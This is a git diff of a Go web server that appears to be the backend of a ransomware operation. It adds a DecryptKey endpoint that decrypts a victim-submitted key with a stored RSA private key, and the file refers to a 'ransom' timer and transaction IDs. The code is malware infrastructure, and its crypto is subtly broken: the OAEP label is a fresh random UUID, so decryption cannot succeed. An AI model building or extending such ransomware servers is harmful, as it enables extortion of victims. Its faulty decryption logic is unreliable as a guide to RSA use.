@@ -1,7 +1,12 @@
 package main
 
 import (
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"html/template"
 	"io/ioutil"
@@ -11,6 +16,7 @@ import (
 	"time"
 
 	"github.com/joho/godotenv"
+	uuid "github.com/satori/go.uuid"
 	"gorm.io/driver/postgres"
 	"gorm.io/gorm"
 )
@@ -19,6 +25,47 @@ var db *gorm.DB
 
 func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("your transaction id"))
+}
+
+func DecryptKey(w http.ResponseWriter, r *http.Request) {
+	key, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "error reading request body", http.StatusInternalServerError)
+		return
+	}
+
+	pemd, err := ioutil.ReadFile("private.pem")
+	if err != nil {
+		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
+		return
+	}
+
+	block, _ := pem.Decode(pemd)
+	if block == nil {
+		log.Fatalf("bad key data: %s", "not PEM-encoded")
+	}
+	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+		log.Fatalf("unknown key type %q, want %q", got, want)
+	}
+
+	// Decode the RSA private key
+	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		log.Fatalf("bad private key: %s", err)
+	}
+
+	uuid, err := uuid.NewV4()
+	if err != nil {
+		log.Fatalf("error generating uuid for key", uuid)
+		return
+	}
+
+	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("encrypted-key-"+uuid.String()))
+	if err != nil {
+		log.Fatalf("decrypt: %s", err)
+	}
+
+	w.Write(out)
 }
 
 // takes in the starting time of the ransom and adds 2 days to it.
